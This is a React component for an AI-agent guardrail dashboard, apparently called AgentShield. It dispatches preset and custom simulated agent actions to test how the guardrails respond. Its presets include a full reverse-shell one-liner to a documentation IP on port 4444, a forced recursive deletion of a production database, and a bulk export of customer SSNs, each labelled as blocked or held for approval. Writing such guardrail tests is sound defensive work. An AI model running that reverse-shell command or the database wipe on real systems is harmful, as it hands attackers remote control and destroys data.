import React, { useState } from 'react';
import { 
  Play, 
  Terminal, 
  Mail, 
  Trash2, 
  Database, 
  DollarSign, 
  Flame, 
  Sparkles, 
  ShieldCheck, 
  ShieldAlert, 
  ShieldX,
  Layers
} from 'lucide-react';

const PRESETS = [
  {
    id: 'safe-temp',
    label: 'Safe: Purge Temp Logs',
    agent: 'DevOps-Automation-Agent',
    actionType: 'DELETE_FILE',
    target: '/var/tmp/node_cache_4412.tmp',
    payload: { reason: 'Clean old temp files', age_hours: 48 },
    expected: 'ALLOWED',
    badgeColor: 'border-emerald-500/40 text-emerald-400 bg-emerald-500/10',
    icon: Trash2,
  },
  {
    id: 'block-db',
    label: 'Blocked: Wipe Production DB',
    agent: 'Rogue-DevOps-Agent',
    actionType: 'DELETE_FILE',
    target: '/srv/data/prod_database.sqlite',
    payload: { force: true, recursive: true },
    expected: 'BLOCKED',
    badgeColor: 'border-rose-500/40 text-rose-400 bg-rose-500/10',
    icon: Flame,
  },
  {
    id: 'hitl-pii',
    label: 'Risky: Export 5k Customer PII',
    agent: 'DataAnalytics-Worker',
    actionType: 'DATA_ACCESS',
    target: 'customers_pii_master_table',
    payload: { query: 'SELECT name, email, ssn FROM customers LIMIT 5000' },
    expected: 'PENDING_APPROVAL',
    badgeColor: 'border-amber-500/40 text-amber-400 bg-amber-500/10',
    icon: Database,
  },
  {
    id: 'safe-email',
    label: 'Safe: Internal Team Alert',
    agent: 'CustomerSupport-Bot',
    actionType: 'SEND_EMAIL',
    target: 'alerts-team@company.internal',
    payload: { subject: 'Weekly SLA metrics report' },
    expected: 'ALLOWED',
    badgeColor: 'border-emerald-500/40 text-emerald-400 bg-emerald-500/10',
    icon: Mail,
  },
  {
    id: 'hitl-finance',
    label: 'Risky: Wire Transfer $12,500',
    agent: 'Finance-Reconcile-Agent',
    actionType: 'FINANCIAL_TRANSFER',
    target: 'Vendor Acct: CloudOps-Infra-Corp',
    payload: { amount: 12500.0, invoice: 'INV-9021', currency: 'USD' },
    expected: 'PENDING_APPROVAL',
    badgeColor: 'border-amber-500/40 text-amber-400 bg-amber-500/10',
    icon: DollarSign,
  },
  {
    id: 'block-shell',
    label: 'Blocked: Reverse Shell Injection',
    agent: 'Compromised-Research-Agent',
    actionType: 'SHELL_EXECUTION',
    target: 'bash -i >& /dev/tcp/198.51.100.23/4444 0>&1',
    payload: { command: 'bash -i' },
    expected: 'BLOCKED',
    badgeColor: 'border-rose-500/40 text-rose-400 bg-rose-500/10',
    icon: Terminal,
  },
];

export default function AgentSimulator({ onSimulate, isSimulating }) {
  const [activeTab, setActiveTab] = useState('presets'); // 'presets' or 'custom'
  
  // Custom form state
  const [agentName, setAgentName] = useState('DevOps-Automation-Agent');
  const [actionType, setActionType] = useState('DELETE_FILE');
  const [targetResource, setTargetResource] = useState('/tmp/scratch_cache.log');
  const [payloadText, setPayloadText] = useState('{\n  "reason": "Automated cleanup"\n}');
  const [jsonError, setJsonError] = useState(null);

  const handleRunPreset = (preset) => {
    onSimulate({
      agent_name: preset.agent,
      action_type: preset.actionType,
      target_resource: preset.target,
      payload: preset.payload,
    });
  };

  const handleCustomSubmit = (e) => {
    e.preventDefault();
    setJsonError(null);

    let parsedPayload = {};
    if (payloadText.trim()) {
      try {
        parsedPayload = JSON.parse(payloadText);
      } catch (err) {
        setJsonError('Invalid JSON format: ' + err.message);
        return;
      }
    }

    onSimulate({
      agent_name: agentName.trim() || 'Generic-Agent',
      action_type: actionType,
      target_resource: targetResource.trim(),
      payload: parsedPayload,
    });
  };

  const handleActionTypeChange = (type) => {
    setActionType(type);
    if (type === 'DELETE_FILE') {
      setTargetResource('/tmp/scratch_cache.log');
      setPayloadText('{\n  "reason": "Routine cleanup"\n}');
    } else if (type === 'SEND_EMAIL') {
      setTargetResource('security@company.internal');
      setPayloadText('{\n  "subject": "System Status Alert",\n  "recipients": ["security@company.internal"]\n}');
    } else if (type === 'DATA_ACCESS') {
      setTargetResource('public_faq');
      setPayloadText('{\n  "query": "SELECT * FROM public_knowledgebase"\n}');
    } else if (type === 'SHELL_EXECUTION') {
      setTargetResource('git status');
      setPayloadText('{\n  "environment": "sandbox"\n}');
    } else if (type === 'FINANCIAL_TRANSFER') {
      setTargetResource('Internal Reimbursement Pool');
      setPayloadText('{\n  "amount": 75.0,\n  "currency": "USD"\n}');
    }
  };

  return (
    <div className="rounded-xl bg-cyber-card border border-cyber-border overflow-hidden shadow-lg">
      {/* Header */}
      <div className="p-4 bg-gradient-to-r from-cyan-950/30 via-cyber-card to-cyber-card border-b border-cyber-border flex items-center justify-between">
        <div className="flex items-center space-x-2.5">
          <div className="p-2 rounded-lg bg-cyan-500/10 text-cyan-400">
            <Play className="h-5 w-5" />
          </div>
          <div>
            <h2 className="text-base font-bold text-white flex items-center space-x-2">
              <span>AI Agent Action Simulator</span>
            </h2>
            <p className="text-xs text-slate-400">
              Dispatch simulated agent intents to test real-time zero-trust guardrails
            </p>
          </div>
        </div>

        {/* Tab switcher */}
        <div className="flex rounded-lg bg-slate-900 p-1 border border-cyber-border text-xs font-medium">
          <button
            onClick={() => setActiveTab('presets')}
            className={`px-3 py-1 rounded-md transition-colors ${
              activeTab === 'presets' 
                ? 'bg-cyan-600 text-white shadow-sm' 
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            Quick Scenarios
          </button>
          <button
            onClick={() => setActiveTab('custom')}
            className={`px-3 py-1 rounded-md transition-colors ${
              activeTab === 'custom' 
                ? 'bg-cyan-600 text-white shadow-sm' 
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            Custom Dispatch
          </button>
        </div>
      </div>

      {/* Body */}
      <div className="p-5">
        {activeTab === 'presets' ? (
          <div>
            <div className="flex items-center justify-between mb-3">
              <span className="text-xs font-semibold text-slate-300 uppercase tracking-wider">
                Click any scenario to dispatch into AgentShield:
              </span>
              <span className="text-xs text-slate-400 hidden sm:inline">
                Evaluates rules & triggers decisions instantaneously
              </span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
              {PRESETS.map((preset) => {
                const Icon = preset.icon;
                return (
                  <button
                    key={preset.id}
                    onClick={() => handleRunPreset(preset)}
                    disabled={isSimulating}
                    className="p-3.5 rounded-lg bg-slate-900/60 hover:bg-slate-900 border border-slate-800 hover:border-cyan-500/40 text-left transition-all duration-150 group relative flex flex-col justify-between space-y-3 disabled:opacity-50"
                  >
                    <div>
                      <div className="flex items-center justify-between mb-1.5">
                        <div className="flex items-center space-x-2">
                          <div className="p-1.5 rounded bg-slate-800 text-cyan-400 group-hover:text-cyan-300">
                            <Icon className="h-4 w-4" />
                          </div>
                          <span className="text-xs font-bold text-slate-100 group-hover:text-cyan-300 transition-colors">
                            {preset.label}
                          </span>
                        </div>
                        <span className={`text-[10px] font-mono px-2 py-0.5 rounded border ${preset.badgeColor}`}>
                          {preset.expected}
                        </span>
                      </div>

                      <p className="text-[11px] text-slate-400 font-mono truncate">
                        Agent: {preset.agent}
                      </p>
                      <p className="text-[11px] text-slate-400 font-mono truncate">
                        Target: {preset.target}
                      </p>
                    </div>

                    <div className="flex items-center justify-between pt-2 border-t border-slate-800 text-[11px] text-slate-400 group-hover:text-cyan-400">
                      <span>Simulate Dispatch</span>
                      <Play className="h-3 w-3 fill-current opacity-70 group-hover:opacity-100" />
                    </div>
                  </button>
                );
              })}
            </div>
          </div>
        ) : (
          /* Custom Form */
          <form onSubmit={handleCustomSubmit} className="space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              {/* Agent Name */}
              <div>
                <label className="block text-xs font-medium text-slate-300 mb-1">
                  AI Agent Identifier
                </label>
                <input
                  type="text"
                  value={agentName}
                  onChange={(e) => setAgentName(e.target.value)}
                  placeholder="e.g. Finance-Reconcile-Agent"
                  className="w-full px-3 py-2 text-xs font-mono bg-slate-900 border border-cyber-border rounded-lg text-slate-100 placeholder-slate-500 focus:outline-none focus:ring-1 focus:ring-cyan-500"
                  required
                />
              </div>

              {/* Action Type */}
              <div>
                <label className="block text-xs font-medium text-slate-300 mb-1">
                  Action Category
                </label>
                <select
                  value={actionType}
                  onChange={(e) => handleActionTypeChange(e.target.value)}
                  className="w-full px-3 py-2 text-xs font-mono bg-slate-900 border border-cyber-border rounded-lg text-slate-100 focus:outline-none focus:ring-1 focus:ring-cyan-500"
                >
                  <option value="DELETE_FILE">DELETE_FILE</option>
                  <option value="SEND_EMAIL">SEND_EMAIL</option>
                  <option value="DATA_ACCESS">DATA_ACCESS</option>
                  <option value="SHELL_EXECUTION">SHELL_EXECUTION</option>
                  <option value="FINANCIAL_TRANSFER">FINANCIAL_TRANSFER</option>
                </select>
              </div>

              {/* Target Resource */}
              <div>
                <label className="block text-xs font-medium text-slate-300 mb-1">
                  Target Resource / Destination
                </label>
                <input
                  type="text"
                  value={targetResource}
                  onChange={(e) => setTargetResource(e.target.value)}
                  placeholder="e.g. /tmp/file.txt, user@domain, table_name"
                  className="w-full px-3 py-2 text-xs font-mono bg-slate-900 border border-cyber-border rounded-lg text-slate-100 placeholder-slate-500 focus:outline-none focus:ring-1 focus:ring-cyan-500"
                  required
                />
              </div>
            </div>

            {/* Payload JSON */}
            <div>
              <div className="flex items-center justify-between mb-1">
                <label className="block text-xs font-medium text-slate-300">
                  Action Parameters (JSON Payload)
                </label>
                {jsonError && (
                  <span className="text-[11px] text-rose-400 font-mono">
                    {jsonError}
                  </span>
                )}
              </div>
              <textarea
                rows={3}
                value={payloadText}
                onChange={(e) => setPayloadText(e.target.value)}
                className="w-full px-3 py-2 text-xs font-mono bg-slate-900 border border-cyber-border rounded-lg text-slate-100 placeholder-slate-500 focus:outline-none focus:ring-1 focus:ring-cyan-500"
              />
            </div>

            {/* Submit */}
            <div className="flex justify-end">
              <button
                type="submit"
                disabled={isSimulating}
                className="px-5 py-2 text-xs font-semibold text-white bg-cyan-600 hover:bg-cyan-500 rounded-lg flex items-center space-x-2 transition-all shadow-md shadow-cyan-950 disabled:opacity-50"
              >
                <Play className="h-4 w-4 fill-current" />
                <span>{isSimulating ? 'Evaluating Safety Engine...' : 'Dispatch Action'}</span>
              </button>
            </div>
          </form>
        )}
      </div>
    </div>
  );
}
